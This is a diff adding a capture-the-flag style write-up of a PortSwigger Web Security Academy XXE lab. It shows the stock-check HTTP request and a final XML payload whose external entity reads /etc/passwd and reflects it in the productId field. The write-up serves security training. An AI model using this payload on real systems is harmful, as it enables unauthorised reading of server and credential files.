@@ -157,3 +157,69 @@ Code:
 	</iframe>
 </body>
 ```
+
+## XXE Injection:
+
+### Lab: Exploiting XXE using external entities to retrieve files
+
+**Description**:
+
+```
+This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
+
+To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 
+```
+
+XML input are parsed server-side & if not filtered properly, this can lead to potentially reading local server files.
+
+The HTTP request sent to the server:
+
+```http
+POST /product/stock HTTP/2
+Host: 0acc00d204844f538296a23f0080007f.web-security-academy.net
+Cookie: session=ase0bdiizPQRn5zjRVowBhCCAJYSSt3G
+Content-Length: 107
+Content-Type: application/xml
+Accept: */*
+
+<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+    <stockCheck>
+        <productId>
+            3
+        </productId>
+        <storeId>
+            1
+        </storeId>
+    </stockCheck>
+```
+
+Sending an invalid product id, reflects it back to us:
+
+<p align="center">
+  <img src="/img/img5.png"><br/>
+</p>
+
+So, we would go for injecting `/etc/passwd` content as our product id, which will obviously cause an error, and result in leaking the content of the file:
+
+<p align="center">
+  <img src="/img/img6.png"><br/>
+</p>
+
+Final payload:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE data [
+        <!ELEMENT stockCheck ANY>
+        <!ENTITY file SYSTEM "file:///etc/passwd">
+    ]>
+    <stockCheck>
+        <productId>
+            &file;
+        </productId>
+        <storeId>
+            1
+        </storeId>
+    </stockCheck>
+```
